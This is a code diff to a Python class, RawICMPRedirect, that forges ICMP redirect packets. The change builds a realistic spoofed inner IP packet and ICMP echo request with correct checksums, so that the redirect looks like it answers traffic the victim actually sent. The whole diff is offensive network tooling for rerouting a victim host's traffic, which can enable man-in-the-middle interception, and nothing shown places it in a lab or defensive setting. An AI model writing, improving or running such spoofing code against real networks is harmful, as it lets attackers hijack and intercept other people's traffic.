@@ -151,12 +151,66 @@ class RawICMPRedirect:
         checksum = 0
         gateway = socket.inet_aton(gateway_ip)
         
-        # Create the original IP packet (victim -> target) that triggered the redirect
-        inner_ip_header = self.craft_ip_header(victim_ip, target_ip, 8)  # IP + minimal ICMP
-        inner_icmp = struct.pack('!BBHHH', 8, 0, 0, 12345, 1)  # Simple ICMP echo
+        # Create a realistic IP packet that the victim would send
+        # This is critical - it must look like a real packet the victim sent
+        inner_ip_version = 4
+        inner_ip_ihl = 5
+        inner_ip_tos = 0
+        inner_ip_total_length = 84  # Standard ping packet size
+        inner_ip_id = 12345
+        inner_ip_flags = 2  # Don't fragment
+        inner_ip_frag_offset = 0
+        inner_ip_ttl = 64
+        inner_ip_protocol = 1  # ICMP
+        inner_ip_checksum = 0
+        inner_ip_src = socket.inet_aton(victim_ip)
+        inner_ip_dst = socket.inet_aton(target_ip)
         
-        # ICMP redirect payload contains the original IP header + 8 bytes of data
-        redirect_data = inner_ip_header + inner_icmp
+        # Create inner IP header
+        inner_ip_header = struct.pack('!BBHHHBBH4s4s',
+                                     (inner_ip_version << 4) + inner_ip_ihl,
+                                     inner_ip_tos,
+                                     inner_ip_total_length,
+                                     inner_ip_id,
+                                     (inner_ip_flags << 13) + inner_ip_frag_offset,
+                                     inner_ip_ttl,
+                                     inner_ip_protocol,
+                                     inner_ip_checksum,
+                                     inner_ip_src,
+                                     inner_ip_dst)
+        
+        # Calculate and set correct IP checksum
+        inner_ip_checksum = self.checksum(inner_ip_header)
+        inner_ip_header = struct.pack('!BBHHHBBH4s4s',
+                                     (inner_ip_version << 4) + inner_ip_ihl,
+                                     inner_ip_tos,
+                                     inner_ip_total_length,
+                                     inner_ip_id,
+                                     (inner_ip_flags << 13) + inner_ip_frag_offset,
+                                     inner_ip_ttl,
+                                     inner_ip_protocol,
+                                     inner_ip_checksum,
+                                     inner_ip_src,
+                                     inner_ip_dst)
+        
+        # Create inner ICMP echo request (what triggered the redirect)
+        inner_icmp_type = 8  # Echo request
+        inner_icmp_code = 0
+        inner_icmp_checksum = 0
+        inner_icmp_id = 12345
+        inner_icmp_seq = 1
+        inner_icmp_data = b'0123456789abcdef' * 3  # 48 bytes of data (typical ping)
+        
+        inner_icmp = struct.pack('!BBHHH', inner_icmp_type, inner_icmp_code, 
+                                inner_icmp_checksum, inner_icmp_id, inner_icmp_seq) + inner_icmp_data
+        
+        # Calculate ICMP checksum
+        inner_icmp_checksum = self.checksum(inner_icmp)
+        inner_icmp = struct.pack('!BBHHH', inner_icmp_type, inner_icmp_code, 
+                                inner_icmp_checksum, inner_icmp_id, inner_icmp_seq) + inner_icmp_data
+        
+        # For ICMP redirect, we only include IP header + 8 bytes of the original packet
+        redirect_data = inner_ip_header + inner_icmp[:8]
         
         # ICMP redirect header
         icmp_header = struct.pack('!BBH4s',
